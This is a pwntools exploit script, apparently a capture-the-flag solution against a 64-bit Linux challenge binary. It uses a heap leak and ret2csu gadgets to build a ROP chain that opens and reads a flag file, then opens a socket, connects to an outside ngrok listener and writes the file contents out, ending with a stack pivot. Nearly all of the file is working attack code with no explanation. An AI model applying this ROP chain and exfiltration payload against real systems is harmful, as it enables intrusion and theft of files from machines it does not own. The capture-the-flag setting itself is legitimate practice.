#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/chall"
TARGET = DIR + EXECUTABLE 
HOST, PORT = "157.173.204.136", 40801
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
elfROP = ROP(elf)

# ==========================[ Configuration
context.update(
    arch=["i386", "amd64", "aarch64"][1],
    endian="little",
    os="linux",
    log_level = ['debug', 'info', 'warn'][2],
    terminal = ['tmux', 'split-window', '-h'],
)

# ==========================[ Exploit

def add_value(where, what):
    CSU_POP_RBX_RBP_R12_R13_R14_R15 = 0x40155a
    CSU_MOV = 0x401540

    ADD_DWORD_PTR_RBP_EBX = 0x000000000040129c # : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
    p = b""
    p += set_register(rbp=where+0x3d, rbx=what&0xFFffFFff, with_call=False)
    p += p64(ADD_DWORD_PTR_RBP_EBX)
    
    return p

def set_register(call=0, edi=0, rsi=0, rdx=0, rbx=0, rbp=1, with_call=True):
    CSU_POP_RBX_RBP_R12_R13_R14_R15 = 0x40155a
    CSU_MOV = 0x401540
 
    p = b""
    p += p64(CSU_POP_RBX_RBP_R12_R13_R14_R15) 
    p += p64(rbx) # rbx
    p += p64(rbp) # rbp
    p += p64(edi) # r12
    p += p64(rsi) # r13
    p += p64(rdx) # r14
    p += p64(call) # r15
    
    if with_call == True:
        p += p64(CSU_MOV)
        p += p64(0xDEADC0DE)*7

    return p

def set_rax(rax, MOV_RAX_RDX_ADDRESS):
    p = b""
    p += set_register(MOV_RAX_RDX_ADDRESS, rdx=rax)
    return p


def exploit(io, libc=null):
    if LOCAL==True:
        #raw_input("Fire GDB!")
        if len(sys.argv) > 1 and sys.argv[1] == "d":
            choosen_gdb = [
                "source /home/mydata/tools/gdb/gdb-pwndbg/gdbinit.py",     # 0 - pwndbg
                "source /home/mydata/tools/gdb/gdb-peda/peda.py",          # 1 - peda
                "source /home/mydata/tools/gdb/gdb-gef/.gdbinit-gef.py"    # 2 - gef
                ][0]
            cmd = choosen_gdb + """
            b *main+324
            b *main+287
            """
            gdb.attach(io, gdbscript=cmd)
    
    io.recvuntil(" [")
    LEAKED_HEAP = int(io.recvuntil("]", drop=True).decode(), 16)
    HEAP_BASE = LEAKED_HEAP - 0x22a0
    SYSCALL_RET = HEAP_BASE + 0x1970
    syscall__value_offset = 0x168c84 # 0x00007ccf1694dbf0-0x7ccf167e4f6c (libc: main_arena+... - libc: "syscall;ret")
    MOV_RAX_RDX = HEAP_BASE + 0x1a08 
    mov_rax_rdx__value_offset = 0x196ffb # 0x00007ccf1694dc40-0x7ccf167b6c45 (libc: main_arena+... - libc: "mov rax,rdx;ret")
    RET_GADGET = elf.search(asm("ret")).__next__()
    print("LEAKED_HEAP          :", hex(LEAKED_HEAP))
    print("HEAP_BASE            :", hex(HEAP_BASE))
    print("------")
    print("SYSCALL_RET          :", hex(SYSCALL_RET))
    print("MOV_RAX_RDX          :", hex(MOV_RAX_RDX))
 
    getdents = [False, True][0]
    if getdents == True:
        FILENAME = b"."
    else:
        FILENAME = b"flag-d41d8cd98f00b204e9800998ecf8427e.txt"
    FILENAME_ADDRESS = LEAKED_HEAP
        
    CONNECT_HOST = 0xcb03e50d_1638_0002 # ngrok: 0.tcp.ap.ngrok.io:12820 (18.141.129.246:12820 == '0x12', '0x8d', '0x81', '0xf6':'0x3214')
    # CONNECT_HOST = 0x100007f39050002 # 127.0.0.1 1337
    CONNECT_ADDRESS = LEAKED_HEAP+0x50
    
    payload_header = b""
    payload_header += FILENAME.ljust(0x50, b"\x00")
    payload_header += p64(CONNECT_HOST).ljust(0x10, b"\x00")
    
    p = b""
    p += payload_header

    p += p64(RET_GADGET)
    p += p64(RET_GADGET)
    p += add_value(SYSCALL_RET, (2**32-syscall__value_offset)&2**32-1 )

    p += p64(RET_GADGET)
    p += add_value(MOV_RAX_RDX, (2**32-mov_rax_rdx__value_offset)&2**32-1)

    fd_open = 0 
    fd_socket = 1 

    # open
    p += p64(RET_GADGET)
    p += set_rax(2, MOV_RAX_RDX)
    p += set_register(SYSCALL_RET, FILENAME_ADDRESS, 0)
    
    if getdents == True:
        # getdents
        p += p64(RET_GADGET)
        p += set_rax(78, MOV_RAX_RDX)
        p += set_register(SYSCALL_RET, fd_open, elf.bss(0x700), 0x500)
    else:
        # read
        p += p64(RET_GADGET)
        p += set_rax(0, MOV_RAX_RDX)
        p += set_register(SYSCALL_RET, fd_open, elf.bss(0x700), 0x500)

    # socket
    p += p64(RET_GADGET)
    p += set_rax(41, MOV_RAX_RDX)
    p += set_register(SYSCALL_RET, 2, 1, 0)
    

    # connect
    p += p64(RET_GADGET)
    p += set_rax(42, MOV_RAX_RDX)
    p += set_register(SYSCALL_RET, fd_socket, CONNECT_ADDRESS, 0x10)
    

    # write
    p += p64(RET_GADGET)
    p += set_rax(1, MOV_RAX_RDX)
    p += set_register(SYSCALL_RET, fd_socket, elf.bss(0x700), 0x500)

    p += set_rax(0x3c, MOV_RAX_RDX)
    p += set_register(SYSCALL_RET, 22, 0, 0)

    io.sendlineafter(":", p)

    # ==== stack overwrite payload
    RDI_OFFSET = cyclic_find(0x61616167)
    
    p = b""
    p += b"B"* (RDI_OFFSET)
    p += p64(HEAP_BASE+0x290+0x10) # Overwrite the Heap Pointer (so it will not delete/free our payload which located in heap)
    p += p64(LEAKED_HEAP+len(payload_header)) 
    p += p64(elf.search(asm("leave; ret")).__next__())
    io.sendlineafter(":", p)
    io.interactive()

if __name__ == "__main__":
    io, libc = null, null

    if args.REMOTE:
        REMOTE = True
        io = remote(HOST, PORT)
        # libc = ELF("libc.so.6")
        
    else:
        LOCAL = True
        io = process(
            [TARGET, ],
            env={
            #     "LD_PRELOAD":DIR+"/___",
            #     "LD_LIBRARY_PATH":DIR+"/___",
            },
        )
    libc = ELF("libc-2.31.so")
    exploit(io, libc)
